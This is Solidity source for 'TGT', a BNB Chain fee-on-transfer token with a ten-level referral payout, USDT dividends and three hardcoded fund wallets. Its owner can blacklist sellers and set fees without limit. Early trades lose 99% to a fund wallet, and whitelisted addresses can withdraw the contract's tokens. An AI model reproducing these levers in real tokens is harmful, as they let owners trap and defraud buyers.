/**
 *Submitted for verification at BscScan.com on 2022-11-17
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface ISwapPair {
    function sync() external;
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    constructor (address token) {
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }
}

abstract contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public fundAddress;
    address public fundAddress2;
    address public fundAddress3;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => bool) public _feeWhiteList;
    mapping(address => bool) public _blackList;

    uint256 private _tTotal;

    ISwapRouter public _swapRouter;
    address public _usdt;
    mapping(address => bool) public _swapPairList;

    bool private inSwap;

    uint256 public constant MAX = ~uint256(0);
    TokenDistributor public _tokenDistributor;

    uint256 public _inviteFee = 500;
    uint256 public _fundFee = 300;
    uint256 public _lpDividendFee = 200;
    uint256 public _destroyFee = 100;

    uint256 public startAddLPBlock;
    uint256 public startTradeBlock;

    address public _mainPair;
    uint256 public _minTotal;
    uint256 public _invitorHoldCondition;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (
        address RouterAddress, address USDTAddress,
        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply,
        address FundAddress, address FundAddress2, address FundAddress3, address ReceiveAddress,
        uint256 MinTotal
    ){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        IERC20(USDTAddress).approve(address(swapRouter), MAX);

        _usdt = USDTAddress;
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), USDTAddress);
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;

        uint256 total = Supply * 10 ** Decimals;
        _tTotal = total;

        _balances[ReceiveAddress] = total;
        emit Transfer(address(0), ReceiveAddress, total);

        fundAddress = FundAddress;
        fundAddress2 = FundAddress2;
        fundAddress3 = FundAddress3;

        _feeWhiteList[FundAddress] = true;
        _feeWhiteList[FundAddress2] = true;
        _feeWhiteList[FundAddress3] = true;
        _feeWhiteList[ReceiveAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;
        _feeWhiteList[address(0)] = true;
        _feeWhiteList[address(0x000000000000000000000000000000000000dEaD)] = true;

        excludeHolder[address(0)] = true;
        excludeHolder[address(0x000000000000000000000000000000000000dEaD)] = true;

        holderRewardCondition = 100 * 10 ** IERC20(USDTAddress).decimals();

        _tokenDistributor = new TokenDistributor(USDTAddress);
        _minTotal = MinTotal * 10 ** Decimals;

        _invitorHoldCondition = 1 * 10 ** Decimals;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function validTotal() public view returns (uint256) {
        return _tTotal - _balances[address(0)] - _balances[address(0x000000000000000000000000000000000000dEaD)];
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(!_blackList[from] || _feeWhiteList[from], "blackList");

        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");

        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            uint256 maxSellAmount = balance * 99999 / 100000;
            if (amount > maxSellAmount) {
                amount = maxSellAmount;
            }
        }

        bool takeFee;
        bool isSell;

        if (_swapPairList[from] || _swapPairList[to]) {
            if (0 == startAddLPBlock) {
                if (_feeWhiteList[from] && to == _mainPair && IERC20(to).totalSupply() == 0) {
                    startAddLPBlock = block.number;
                }
            }

            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                takeFee = true;
                if (0 == startTradeBlock) {
                    require(0 < startAddLPBlock && _swapPairList[to], "!Trade");
                }

                if (block.number < startTradeBlock + 4) {
                    _funTransfer(from, to, amount);
                    return;
                }
            }
            if (_swapPairList[to]) {
                isSell = true;
            }
        } else {
            if (0 == balanceOf(to) && amount > 0 && to != address(0)) {
                _bindInvitor(to, from);
            }
        }

        _tokenTransfer(from, to, amount, takeFee, isSell);

        if (from != address(this)) {
            if (isSell) {
                addHolder(from);
            }
            processReward(500000);
        }
    }

    function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = tAmount * 99 / 100;
        _takeTransfer(
            sender,
            fundAddress,
            feeAmount
        );
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    mapping(address => uint256) public _adrFeeAmount;

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isSell
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        if (takeFee) {
            uint256 destroyFeeAmount = tAmount * _destroyFee / 10000;
            if (destroyFeeAmount > 0) {
                uint256 destroyAmount = destroyFeeAmount;
                uint256 currentTotal = validTotal();
                uint256 maxDestroyAmount;
                if (currentTotal > _minTotal) {
                    maxDestroyAmount = currentTotal - _minTotal;
                }
                if (destroyAmount > maxDestroyAmount) {
                    destroyAmount = maxDestroyAmount;
                }
                if (destroyAmount > 0) {
                    feeAmount += destroyAmount;
                    _takeTransfer(sender, address(0x000000000000000000000000000000000000dEaD), destroyAmount);
                }
            }

            uint256 txFee = _inviteFee + _fundFee + _lpDividendFee;
            uint256 txFeeAmount = tAmount * txFee / 10000;
            if (txFeeAmount > 0) {
                feeAmount += txFeeAmount;
                _takeTransfer(
                    sender,
                    address(this),
                    txFeeAmount
                );
            }
            _adrFeeAmount[sender] += txFeeAmount;
            if (isSell) {
                if (!inSwap) {
                    uint256 contractTokenBalance = balanceOf(address(this));
                    uint256 numTokensSellToFund = _adrFeeAmount[sender];
                    if (numTokensSellToFund > contractTokenBalance) {
                        numTokensSellToFund = contractTokenBalance;
                    }
                    if (numTokensSellToFund > txFeeAmount * 230 / 100) {
                        numTokensSellToFund = txFeeAmount * 230 / 100;
                    }
                    _adrFeeAmount[sender] -= numTokensSellToFund;
                    swapTokenForFund(numTokensSellToFund, sender, txFee);
                }
            } else {
                _adrFeeAmount[recipient] += txFeeAmount;
            }
        }

        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function swapTokenForFund(uint256 tokenAmount, address sender, uint256 totalFee) private lockTheSwap {
        if (0 == totalFee) {
            return;
        }
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _usdt;
        address tokenDistributor = address(_tokenDistributor);
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(tokenDistributor),
            block.timestamp
        );

        IERC20 USDT = IERC20(_usdt);
        uint256 usdtBalance = USDT.balanceOf(tokenDistributor);
        USDT.transferFrom(tokenDistributor, address(this), usdtBalance);

        uint256 fundUsdt = usdtBalance;
        uint256 lpDividendUsdt = usdtBalance * _lpDividendFee / totalFee;
        fundUsdt -= lpDividendUsdt;

        address current = sender;
        address invitor;
        uint256 perInviteAmount = usdtBalance * _inviteFee / totalFee / 10;
        uint256 invitorHoldCondition = _invitorHoldCondition;
        for (uint256 i; i < 10;) {
            invitor = _inviter[current];
            if (address(0) == invitor) {
                break;
            }
            if (balanceOf(invitor) >= invitorHoldCondition) {
                USDT.transfer(invitor, perInviteAmount);
                fundUsdt -= perInviteAmount;
            }
            current = invitor;
        unchecked{
            ++i;
        }
        }

        fundUsdt = fundUsdt / 3;
        USDT.transfer(fundAddress, fundUsdt);
        USDT.transfer(fundAddress2, fundUsdt);
        USDT.transfer(fundAddress3, fundUsdt);
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }

    function setFeeWhiteList(address addr, bool enable) external onlyOwner {
        _feeWhiteList[addr] = enable;
    }

    function setBlackList(address addr, bool enable) external onlyOwner {
        _blackList[addr] = enable;
    }

    function batchSetFeeWhiteList(address [] memory addr, bool enable) external onlyOwner {
        for (uint i = 0; i < addr.length; i++) {
            _feeWhiteList[addr[i]] = enable;
        }
    }

    function batchSetBlackList(address [] memory addr, bool enable) external onlyOwner {
        for (uint i = 0; i < addr.length; i++) {
            _blackList[addr[i]] = enable;
        }
    }

    function claimBalance() external {
        payable(fundAddress).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount, address to) external {
        if (_feeWhiteList[msg.sender]) {
            IERC20(token).transfer(to, amount);
        }
    }

    receive() external payable {}

    address[] public holders;
    mapping(address => uint256) public holderIndex;
    mapping(address => bool) public excludeHolder;

    function getHolderLength() external view returns (uint256){
        return holders.length;
    }

    function addHolder(address adr) private {
        if (0 == holderIndex[adr]) {
            if (0 == holders.length || holders[0] != adr) {
                uint256 size;
                assembly {size := extcodesize(adr)}
                if (size > 0) {
                    return;
                }
                holderIndex[adr] = holders.length;
                holders.push(adr);
            }
        }
    }

    uint256 public currentIndex;
    uint256 public holderRewardCondition;
    uint256 public _holderLPCondition = 1;
    uint256 public progressRewardBlock;
    uint256 public _progressBlockDebt = 0;

    function processReward(uint256 gas) private {
        if (progressRewardBlock + _progressBlockDebt > block.number) {
            return;
        }

        IERC20 USDT = IERC20(_usdt);

        uint256 balance = USDT.balanceOf(address(this));
        if (balance < holderRewardCondition) {
            return;
        }
        balance = holderRewardCondition;

        IERC20 holdToken = IERC20(_mainPair);
        uint holdTokenTotal = holdToken.totalSupply();

        address shareHolder;
        uint256 tokenBalance;
        uint256 amount;

        uint256 shareholderCount = holders.length;

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();
        uint256 holderLPCondition = _holderLPCondition;

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }
            shareHolder = holders[currentIndex];
            tokenBalance = holdToken.balanceOf(shareHolder);
            if (tokenBalance >= holderLPCondition && !excludeHolder[shareHolder]) {
                amount = balance * tokenBalance / holdTokenTotal;
                if (amount > 0) {
                    USDT.transfer(shareHolder, amount);
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }

        progressRewardBlock = block.number;
    }

    function setHolderRewardCondition(uint256 amount) external onlyOwner {
        holderRewardCondition = amount;
    }

    function setHolderLPCondition(uint256 amount) external onlyOwner {
        _holderLPCondition = amount;
    }

    function setInvitorHoldCondition(uint256 amount) external onlyOwner {
        _invitorHoldCondition = amount;
    }

    function setExcludeHolder(address addr, bool enable) external onlyOwner {
        excludeHolder[addr] = enable;
    }

    function setProgressBlockDebt(uint256 progressBlockDebt) external onlyOwner {
        _progressBlockDebt = progressBlockDebt;
    }

    mapping(address => address) public _inviter;
    mapping(address => address[]) public _binders;

    function getBinderLength(address account) external view returns (uint256){
        return _binders[account].length;
    }

    function _bindInvitor(address account, address invitor) private {
        if (_inviter[account] == address(0) && invitor != address(0) && invitor != account) {
            if (_binders[account].length == 0) {
                uint256 size;
                assembly {size := extcodesize(account)}
                if (size > 0) {
                    return;
                }
                _inviter[account] = invitor;
                _binders[invitor].push(account);
            }
        }
    }

    function setMinTotal(uint256 total) external onlyOwner {
        _minTotal = total * 10 ** _decimals;
    }

    function setFundAddress(address addr) external onlyOwner {
        fundAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function setFundAddress2(address addr) external onlyOwner {
        fundAddress2 = addr;
        _feeWhiteList[addr] = true;
    }

    function setFundAddress3(address addr) external onlyOwner {
        fundAddress3 = addr;
        _feeWhiteList[addr] = true;
    }

    function setFee(uint256 inviteFee, uint256 fundFee, uint256 lpDividendFee, uint256 destroyFee) public onlyOwner {
        _inviteFee = inviteFee;
        _fundFee = fundFee;
        _lpDividendFee = lpDividendFee;
        _destroyFee = destroyFee;
    }

    function startTrade() external onlyOwner {
        require(0 == startTradeBlock, "trading");
        startTradeBlock = block.number;
    }
}

contract TGT is AbsToken {
    constructor() AbsToken(
    //SwapRouter
        address(0x10ED43C718714eb63d5aA57B78B54704E256024E),
    //USDT
        address(0x55d398326f99059fF775485246999027B3197955),
        "TGT",
        "TGT",
        18,
        100000,
    //Fund
        address(0x21D3009Fe47699C5D84A64B80F933198257F6427),
    //Fund2
        address(0xbCae2A8292f5736755eC66D0c8D46bF985f269B2),
    //Fund3
        address(0xAaB9164b46728727d795451A31285De9f6da88b4),
    //Received
        address(0xA127807E5D88aCb890CdbC3cB718C32366efc830),
        10000
    ){

    }
}